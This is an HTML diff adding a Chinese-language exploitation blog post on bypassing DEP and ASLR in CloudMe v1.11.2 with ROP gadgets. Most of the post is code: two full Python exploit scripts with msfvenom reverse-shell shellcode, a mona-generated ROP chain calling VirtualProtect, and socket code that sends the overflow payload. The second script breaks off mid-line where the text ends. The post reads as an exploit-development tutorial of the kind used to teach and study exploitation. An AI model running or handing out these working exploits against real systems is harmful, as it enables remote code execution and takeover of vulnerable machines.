@@ -188,6 +188,122 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2022/05/08/CloudMe-v1-11-2-DEP-bypass-using-ROP-gadgets/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="n0maj1o24">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Technical Memorandum">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/08/CloudMe-v1-11-2-DEP-bypass-using-ROP-gadgets/" class="post-title-link" itemprop="url">CloudMe v1.11.2 DEP and ASLR bypass using ROP gadgets</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-05-08 15:56:36" itemprop="dateCreated datePublished" datetime="2022-05-08T15:56:36Z">2022-05-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-12 15:30:01" itemprop="dateModified" datetime="2022-05-12T15:30:01Z">2022-05-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Windows-Exploitation/" itemprop="url" rel="index"><span itemprop="name">Windows Exploitation</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/05/08/CloudMe-v1-11-2-DEP-bypass-using-ROP-gadgets/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/08/CloudMe-v1-11-2-DEP-bypass-using-ROP-gadgets/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>测试环境：<code>Windows 10 21H2 32</code>位，开启全局<code>DEP</code>。这里来看如何绕过<code>DEP</code>和<code>ASLR</code>。附带演示一下基于<code>SEH</code>栈溢出<code>DEP bypass</code>与普通<code>SEH</code>栈溢出利用代码结构的不同。</p>
+<p><strong>普通栈溢出利用：</strong></p>
+<p>这个程序可以用普通的栈溢出<code>DEP bypass</code>来完成利用。此时<code>Offset</code>为<code>1052</code>。太简单了，就不过多解释了。</p>
+<p>查找未开启<code>ASLR</code>的<code>DLL</code>，并查找<code>RETN</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; .load pykd.pyd</span><br><span class="line">0:014&gt; !py mona noaslr</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/08/CloudMe-v1-11-2-DEP-bypass-using-ROP-gadgets/02.png" alt="seh"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; !py mona find -<span class="built_in">type</span> instr -s <span class="string">"retn"</span> -p 10 -o -m Qt5Core.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/08/CloudMe-v1-11-2-DEP-bypass-using-ROP-gadgets/03.png" alt="seh"></p>
+<p>来看一下最终的利用代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">target=<span class="string">"127.0.0.1"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># msfvenom -p windows/shell_reverse_tcp LHOST=192.168.13.137 LPORT=4444 EXITFUNC=thread -f python -v shellcode -b '\x00'</span></span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">b""</span></span><br><span class="line">shellcode += <span class="string">b"\xb8\x26\xe9\x79\xbf\xdb\xdc\xd9\x74\x24\xf4"</span></span><br><span class="line">shellcode += <span class="string">b"\x5e\x33\xc9\xb1\x52\x31\x46\x12\x83\xee\xfc"</span></span><br><span class="line">shellcode += <span class="string">b"\x03\x60\xe7\x9b\x4a\x90\x1f\xd9\xb5\x68\xe0"</span></span><br><span class="line">shellcode += <span class="string">b"\xbe\x3c\x8d\xd1\xfe\x5b\xc6\x42\xcf\x28\x8a"</span></span><br><span class="line">shellcode += <span class="string">b"\x6e\xa4\x7d\x3e\xe4\xc8\xa9\x31\x4d\x66\x8c"</span></span><br><span class="line">shellcode += <span class="string">b"\x7c\x4e\xdb\xec\x1f\xcc\x26\x21\xff\xed\xe8"</span></span><br><span class="line">shellcode += <span class="string">b"\x34\xfe\x2a\x14\xb4\x52\xe2\x52\x6b\x42\x87"</span></span><br><span class="line">shellcode += <span class="string">b"\x2f\xb0\xe9\xdb\xbe\xb0\x0e\xab\xc1\x91\x81"</span></span><br><span class="line">shellcode += <span class="string">b"\xa7\x9b\x31\x20\x6b\x90\x7b\x3a\x68\x9d\x32"</span></span><br><span class="line">shellcode += <span class="string">b"\xb1\x5a\x69\xc5\x13\x93\x92\x6a\x5a\x1b\x61"</span></span><br><span class="line">shellcode += <span class="string">b"\x72\x9b\x9c\x9a\x01\xd5\xde\x27\x12\x22\x9c"</span></span><br><span class="line">shellcode += <span class="string">b"\xf3\x97\xb0\x06\x77\x0f\x1c\xb6\x54\xd6\xd7"</span></span><br><span class="line">shellcode += <span class="string">b"\xb4\x11\x9c\xbf\xd8\xa4\x71\xb4\xe5\x2d\x74"</span></span><br><span class="line">shellcode += <span class="string">b"\x1a\x6c\x75\x53\xbe\x34\x2d\xfa\xe7\x90\x80"</span></span><br><span class="line">shellcode += <span class="string">b"\x03\xf7\x7a\x7c\xa6\x7c\x96\x69\xdb\xdf\xff"</span></span><br><span class="line">shellcode += <span class="string">b"\x5e\xd6\xdf\xff\xc8\x61\xac\xcd\x57\xda\x3a"</span></span><br><span class="line">shellcode += <span class="string">b"\x7e\x1f\xc4\xbd\x81\x0a\xb0\x51\x7c\xb5\xc1"</span></span><br><span class="line">shellcode += <span class="string">b"\x78\xbb\xe1\x91\x12\x6a\x8a\x79\xe2\x93\x5f"</span></span><br><span class="line">shellcode += <span class="string">b"\x2d\xb2\x3b\x30\x8e\x62\xfc\xe0\x66\x68\xf3"</span></span><br><span class="line">shellcode += <span class="string">b"\xdf\x97\x93\xd9\x77\x3d\x6e\x8a\xb7\x6a\x7d"</span></span><br><span class="line">shellcode += <span class="string">b"\xc3\x50\x69\x7d\xc2\xfc\xe4\x9b\x8e\xec\xa0"</span></span><br><span class="line">shellcode += <span class="string">b"\x34\x27\x94\xe8\xce\xd6\x59\x27\xab\xd9\xd2"</span></span><br><span class="line">shellcode += <span class="string">b"\xc4\x4c\x97\x12\xa0\x5e\x40\xd3\xff\x3c\xc7"</span></span><br><span class="line">shellcode += <span class="string">b"\xec\xd5\x28\x8b\x7f\xb2\xa8\xc2\x63\x6d\xff"</span></span><br><span class="line">shellcode += <span class="string">b"\x83\x52\x64\x95\x39\xcc\xde\x8b\xc3\x88\x19"</span></span><br><span class="line">shellcode += <span class="string">b"\x0f\x18\x69\xa7\x8e\xed\xd5\x83\x80\x2b\xd5"</span></span><br><span class="line">shellcode += <span class="string">b"\x8f\xf4\xe3\x80\x59\xa2\x45\x7b\x28\x1c\x1c"</span></span><br><span class="line">shellcode += <span class="string">b"\xd0\xe2\xc8\xd9\x1a\x35\x8e\xe5\x76\xc3\x6e"</span></span><br><span class="line">shellcode += <span class="string">b"\x57\x2f\x92\x91\x58\xa7\x12\xea\x84\x57\xdc"</span></span><br><span class="line">shellcode += <span class="string">b"\x21\x0d\x77\x3f\xe3\x78\x10\xe6\x66\xc1\x7d"</span></span><br><span class="line">shellcode += <span class="string">b"\x19\x5d\x06\x78\x9a\x57\xf7\x7f\x82\x12\xf2"</span></span><br><span class="line">shellcode += <span class="string">b"\xc4\x04\xcf\x8e\x55\xe1\xef\x3d\x55\x20"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_rop_chain</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">  rop_gadgets = [</span><br><span class="line">    <span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">    <span class="number">0x68c50d64</span>,  <span class="comment"># POP EBP # RETN [Qt5Core.dll]</span></span><br><span class="line">    <span class="number">0x68c50d64</span>,  <span class="comment"># skip 4 bytes [Qt5Core.dll]</span></span><br><span class="line">    <span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">    <span class="number">0x68fa7ca2</span>,  <span class="comment"># POP EDX # RETN [Qt5Core.dll]</span></span><br><span class="line">    <span class="number">0xfffffdff</span>,  <span class="comment"># Value to negate, will become 0x00000201</span></span><br><span class="line">    <span class="number">0x68bd5fe4</span>,  <span class="comment"># NEG EDX # RETN 0x0C [Qt5Core.dll]</span></span><br><span class="line">    <span class="number">0x68d773fe</span>,  <span class="comment"># POP EBX # RETN [Qt5Core.dll]</span></span><br><span class="line">    <span class="number">0x41414141</span>,  <span class="comment"># Filler (RETN offset compensation)</span></span><br><span class="line">    <span class="number">0x41414141</span>,  <span class="comment"># Filler (RETN offset compensation)</span></span><br><span class="line">    <span class="number">0x41414141</span>,  <span class="comment"># Filler (RETN offset compensation)</span></span><br><span class="line">    <span class="number">0xffffffff</span>,  <span class="comment">#</span></span><br><span class="line">    <span class="number">0x68fb3ef1</span>,  <span class="comment"># INC EBX # RETN [Qt5Core.dll]</span></span><br><span class="line">    <span class="number">0x68f8063c</span>,  <span class="comment"># ADD EBX,EDX # ADD AL,0A # RETN [Qt5Core.dll]</span></span><br><span class="line">    <span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">    <span class="number">0x68f9a472</span>,  <span class="comment"># POP EDX # RETN [Qt5Core.dll]</span></span><br><span class="line">    <span class="number">0xffffffc0</span>,  <span class="comment"># Value to negate, will become 0x00000040</span></span><br><span class="line">    <span class="number">0x68bd5fe4</span>,  <span class="comment"># NEG EDX # RETN 0x0C [Qt5Core.dll]</span></span><br><span class="line">    <span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">    <span class="number">0x68ae7e17</span>,  <span class="comment"># POP ECX # RETN [Qt5Core.dll]</span></span><br><span class="line">    <span class="number">0x41414141</span>,  <span class="comment"># Filler (RETN offset compensation)</span></span><br><span class="line">    <span class="number">0x41414141</span>,  <span class="comment"># Filler (RETN offset compensation)</span></span><br><span class="line">    <span class="number">0x41414141</span>,  <span class="comment"># Filler (RETN offset compensation)</span></span><br><span class="line">    <span class="number">0x68c13baa</span>,  <span class="comment"># &amp;Writable location [Qt5Core.dll]</span></span><br><span class="line">    <span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">    <span class="number">0x68c018b6</span>,  <span class="comment"># POP EDI # RETN [Qt5Core.dll]</span></span><br><span class="line">    <span class="number">0x68cef5b4</span>,  <span class="comment"># RETN (ROP NOP) [Qt5Core.dll]</span></span><br><span class="line">    <span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">    <span class="number">0x68d54786</span>,  <span class="comment"># POP ESI # RETN [Qt5Core.dll]</span></span><br><span class="line">    <span class="number">0x68a9314e</span>,  <span class="comment"># JMP [EAX] [Qt5Core.dll]</span></span><br><span class="line">    <span class="number">0x68b226c5</span>,  <span class="comment"># POP EAX # RETN [Qt5Core.dll]</span></span><br><span class="line">    <span class="number">0x690398a8</span>,  <span class="comment"># ptr to &amp;VirtualProtect() [IAT Qt5Core.dll]</span></span><br><span class="line">    <span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">    <span class="number">0x68fd02fb</span>,  <span class="comment"># PUSHAD # RETN [Qt5Core.dll]</span></span><br><span class="line">    <span class="comment">#[---INFO:extras:---]</span></span><br><span class="line">    <span class="number">0x68aa11e6</span>,  <span class="comment"># ptr to 'push esp # ret ' [Qt5Core.dll]</span></span><br><span class="line">  ]</span><br><span class="line">  <span class="keyword">return</span> <span class="string">b''</span>.join(struct.pack(<span class="string">'&lt;I'</span>, _) <span class="keyword">for</span> _ <span class="keyword">in</span> rop_gadgets)</span><br><span class="line"></span><br><span class="line">rop_chain = create_rop_chain()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buff_size = <span class="number">4000</span></span><br><span class="line">junk = <span class="string">b'A'</span>*<span class="number">1052</span></span><br><span class="line">retn = struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x68c1f01c</span>)   <span class="comment"># 0x68c1f01c : retn</span></span><br><span class="line">nops = <span class="string">b"\x90"</span>*<span class="number">32</span></span><br><span class="line">junk2 = <span class="string">b'C'</span>*(buff_size<span class="number">-1052</span>-len(shellcode)<span class="number">-32</span>)</span><br><span class="line">payload = junk+retn+rop_chain+nops+shellcode+junk2</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((target,<span class="number">8888</span>))</span><br><span class="line">    s.send(payload)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure>
+
+<p>利用<code>mona</code>自动生成的<code>ROP Chain</code>，所使用的<code>Qt5Core.dll</code>没有开启<code>ASLR</code>，所以这里采用的选择未开启<code>ASLR</code>的<code>DLL</code>来<code>bypass ASLR</code>。</p>
+<p>成功反弹<code>shell</code>：</p>
+<p><img src="/2022/05/08/CloudMe-v1-11-2-DEP-bypass-using-ROP-gadgets/01.png" alt="seh"></p>
+<p><strong>SEH栈溢出利用：</strong></p>
+<p>触发<code>SEH</code>栈溢出<code>Offset</code>为<code>2348</code>，注意这里是指覆盖<code>Next SEH</code>而不是<code>SEH Handler</code>。按照普通<code>SEH</code>栈溢出漏洞利用，<code>P/P/R</code>配合<code>JMP</code>，来一下出现的问题：</p>
+<p><code>P/P/R</code>处下断点，异常发生之后，进入<code>P/P/R</code>：</p>
+<p><img src="/2022/05/08/CloudMe-v1-11-2-DEP-bypass-using-ROP-gadgets/04.png" alt="seh"></p>
+<p>想要执行<code>JMP</code>指令，因为<code>DEP</code>的存在，执行失败：</p>
+<p><img src="/2022/05/08/CloudMe-v1-11-2-DEP-bypass-using-ROP-gadgets/05.png" alt="seh"></p>
+<p>结合前一篇文章介绍，这里需要一条能够跳转到<code>ROP Chain</code>的指令覆盖<code>SEH Handler</code>，上一篇文章介绍的比较详细，这里给出最后的利用脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">target=<span class="string">"127.0.0.1"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># msfvenom -p windows/shell_reverse_tcp LHOST=192.168.13.137 LPORT=4444 EXITFUNC=thread -f python -v shellcode -b '\x00'</span></span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">b""</span></span><br><span class="line">shellcode += <span class="string">b"\xda\xd9\xd9\x74\x24\xf4\xba\xc2\x93\x9a\x62"</span></span><br><span class="line">shellcode += <span class="string">b"\x58\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x13"</span></span><br><span class="line">shellcode += <span class="string">b"\x03\x92\x80\x78\x97\xee\x4f\xfe\x58\x0e\x90"</span></span><br><span class="line">shellcode += <span class="string">b"\x9f\xd1\xeb\xa1\x9f\x86\x78\x91\x2f\xcc\x2c"</span></span><br><span class="line">shellcode += <span class="string">b"\x1e\xdb\x80\xc4\x95\xa9\x0c\xeb\x1e\x07\x6b"</span></span><br><span class="line">shellcode += <span class="string">b"\xc2\x9f\x34\x4f\x45\x1c\x47\x9c\xa5\x1d\x88"</span></span><br><span class="line">shellcode += <span class="string">b"\xd1\xa4\x5a\xf5\x18\xf4\x33\x71\x8e\xe8\x30"</span></span><br><span class="line">shellcode += <span class="string">b"\xcf\x13\x83\x0b\xc1\x13\x70\xdb\xe0\x32\x27"</span></span><br><span class="line">shellcode += <span class="string">b"\x57\xbb\x94\xc6\xb4\xb7\x9c\xd0\xd9\xf2\x57"</span></span><br><span class="line">shellcode += <span class="string">b"\x6b\x29\x88\x69\xbd\x63\x71\xc5\x80\x4b\x80"</span></span><br><span class="line">shellcode += <span class="string">b"\x17\xc5\x6c\x7b\x62\x3f\x8f\x06\x75\x84\xed"</span></span><br><span class="line">shellcode += <span class="string">b"\xdc\xf0\x1e\x55\x96\xa3\xfa\x67\x7b\x35\x89"</span></span><br><span class="line">shellcode += <span class="string">b"\x64\x30\x31\xd5\x68\xc7\x96\x6e\x94\x4c\x19"</span></span><br><span class="line">shellcode += <span class="string">b"\xa0\x1c\x16\x3e\x64\x44\xcc\x5f\x3d\x20\xa3"</span></span><br><span class="line">shellcode += <span class="string">b"\x60\x5d\x8b\x1c\xc5\x16\x26\x48\x74\x75\x2f"</span></span><br><span class="line">shellcode += <span class="string">b"\xbd\xb5\x85\xaf\xa9\xce\xf6\x9d\x76\x65\x90"</span></span><br><span class="line">shellcode += <span class="string">b"\xad\xff\xa3\x67\xd1\xd5\x14\xf7\x2c\xd6\x64"</span></span><br><span class="line">shellcode += <span class="string">b"\xde\xea\x82\x34\x48\xda\xaa\xde\x88\xe3\x7e"</span></span><br><span class="line">shellcode += <span class="string">b"\x70\xd8\x4b\xd1\x31\x88\x2b\x81\xd9\xc2\xa3"</span></span><br><span class="line">shellcode += <span class="string">b"\xfe\xfa\xed\x69\x97\x91\x14\xfa\x58\xcd\x1b"</span></span><br><span class="line">shellcode += <span class="string">b"\x73\x30\x0c\x23\x92\x9d\x99\xc5\xfe\x0d\xcc"</span></span><br><span class="line">shellcode += <span class="string">b"\x5e\x97\xb4\x55\x14\x06\x38\x40\x51\x08\xb2"</span></span><br><span class="line">shellcode += <span class="string">b"\x67\xa6\xc7\x33\x0d\xb4\xb0\xb3\x58\xe6\x17"</span></span><br><span class="line">shellcode += <span class="string">b"\xcb\x76\x8e\xf4\x5e\x1d\x4e\x72\x43\x8a\x19"</span></span><br><span class="line">shellcode += <span class="string">b"\xd3\xb5\xc3\xcf\xc9\xec\x7d\xed\x13\x68\x45"</span></span><br><span class="line">shellcode += <span class="string">b"\xb5\xcf\x49\x48\x34\x9d\xf6\x6e\x26\x5b\xf6"</span></span><br><span class="line">shellcode += <span class="string">b"\x2a\x12\x33\xa1\xe4\xcc\xf5\x1b\x47\xa6\xaf"</span></span><br><span class="line">shellcode += <span class="string">b"\xf0\x01\x2e\x29\x3b\x92\x28\x36\x16\x64\xd4"</span></span><br><span class="line">shellcode += <span class="string">b"\x87\xcf\x31\xeb\x28\x98\xb5\x94\x54\x38\x39"</span></span><br><span class="line">shellcode += <span class="string">b"\x4f\xdd\x58\xd8\x45\x28\xf1\x45\x0c\x91\x9c"</span></span><br><span class="line">shellcode += <span class="string">b"\x75\xfb\xd6\x98\xf5\x09\xa7\x5e\xe5\x78\xa2"</span></span><br><span class="line">shellcode += <span class="string">b"\x1b\xa1\x91\xde\x34\x44\x95\x4d\x34\x4d"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_rop_chain</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">	rop_gadgets = [</span><br><span class="line">	<span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">	<span class="number">0x68c50d64</span>,  <span class="comment"># POP EBP # RETN [Qt5Core.dll]</span></span><br><span class="line">	<span class="number">0x41414141</span>,  <span class="comment"># junk</span></span><br><span class="line">	<span class="number">0x68c50d64</span>,  <span class="comment"># skip 4 bytes [Qt5Core.dll]</span></span><br><span class="line">	<span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">	<span class="number">0x68fa7ca2</span>,  <span class="comment"># POP EDX # RETN [Qt5Core.dll]</span></span><br><span class="line">	<span class="number">0xfffffdff</span>,  <span class="comment"># Value to negate, will become 0x00000201</span></span><br><span class="line">	<span class="number">0x68bd5fe4</span>,  <span class="comment"># NEG EDX # RETN 0x0C [Qt5Core.dll]</span></span><br><span class="line">	<span class="number">0x68d773fe</span>,  <span class="comment"># POP EBX # RETN [Qt5Core.dll]</span></span><br><span class="line">	<span class="number">0x41414141</span>,  <span class="comment"># Filler (RETN offset compensation)</span></span><br><span class="line">	<span class="number">0x41414141</span>,  <span class="comment"># Filler (RETN offset compensation)</span></span><br><span class="line">	<span class="number">0x41414141</span>,  <span class="comment"># Filler (RETN offset compensation)</span></span><br><span class="line">	<span class="number">0xffffffff</span>,  <span class="comment">#</span></span><br><span class="line">	<span class="number">0x68fb3ef1</span>,  <span class="comment"># INC EBX # RETN [Qt5Core.dll]</span></span><br><span class="line">	<span class="number">0x68f8063c</span>,  <span class="comment"># ADD EBX,EDX # ADD AL,0A # RETN [Qt5Core.dll]</span></span><br><span class="line">	<span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">	<span class="number">0x68f9a472</span>,  <span class="comment"># POP EDX # RETN [Qt5Core.dll]</span></span><br><span class="line">	<span class="number">0xffffffc0</span>,  <span class="comment"># Value to negate, will become 0x00000040</span></span><br><span class="line">	<span class="number">0x68bd5fe4</span>,  <span class="comment"># NEG EDX # RETN 0x0C [Qt5Core.dll]</span></span><br><span class="line">	<span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">	<span class="number">0x68ae7e17</span>,  <span class="comment"># POP ECX # RETN [Qt5Core.dll]</span></span><br><span class="line">	<span class="number">0x41414141</span>,  <span class="comment"># Filler (RETN offset compensation)</span></span><br><span class="line">	<span class="number">0x41414141</span>,  <span class="comment"># Filler (RETN offset compensation)</span></span><br><span class="line">	<span class="number">0x41414141</span>,  <span class="comment"># Filler (RETN offset compensation)</span></span><br><span class="line">	<span class="number">0x68c13baa</span>,  <span class="comment"># &amp;Writable location [Qt5Core.dll]</span></span><br><span class="line">	<span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">	<span class="number">0x68c018b6</span>,  <span class="comment"># POP EDI # RETN [Qt5Core.dll]</span></span><br><span class="line">	<span class="number">0x68cef5b4</span>,  <span class="comment"># RETN (ROP NOP) [Qt5Core.dll]</span></span><br><span class="line">	<span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">	<span class="number">0x68d54786</span>,  <span class="comment"># POP ESI # RETN [Qt5Core.dll]</span></span><br><span class="line">	<span class="number">0x68a9314e</span>,  <span class="comment"># JMP [EAX] [Qt5Core.dll]</span></span><br><span class="line">	<span class="number">0x68b226c5</span>,  <span class="comment"># POP EAX # RETN [Qt5Core.dll]</span></span><br><span class="line">	<span class="number">0x690398a8</span>,  <span class="comment"># ptr to &amp;VirtualProtect() [IAT Qt5Core.dll]</span></span><br><span class="line">	<span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">	<span class="number">0x68fd02fb</span>,  <span class="comment"># PUSHAD # RETN [Qt5Core.dll]</span></span><br><span class="line">	<span class="comment">#[---INFO:extras:---]</span></span><br><span class="line">	<span class="number">0x68aa11e6</span>,  <span class="comment"># ptr to 'push esp # ret ' [Qt5Core.dll]</span></span><br><span class="line">	]</span><br><span class="line">	<span class="keyword">return</span> <span class="string">b''</span>.join(struct.pack(<span class="string">'&lt;I'</span>, _) <span class="keyword">for</span> _ <span class="keyword">in</span> rop_gadgets)</span><br><span class="line"></span><br><span class="line">rop_chain = create_rop_chain()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buff_size = <span class="number">4000</span></span><br><span class="line"><span class="comment">#junk = b'A'*2348</span></span><br><span class="line"><span class="comment">#nseh = b"\xeb\x06\x90\x90"</span></span><br><span class="line">junk = <span class="string">b'A'</span>*<span class="number">2352</span></span><br><span class="line"><span class="comment">#seh = struct.pack("&lt;L",0x68a9528e)  #0x68a9528e : pop esi # pop edi # ret</span></span><br><span class="line">seh = struct.pack(<span class="string">"&lt;L"</span>,<span 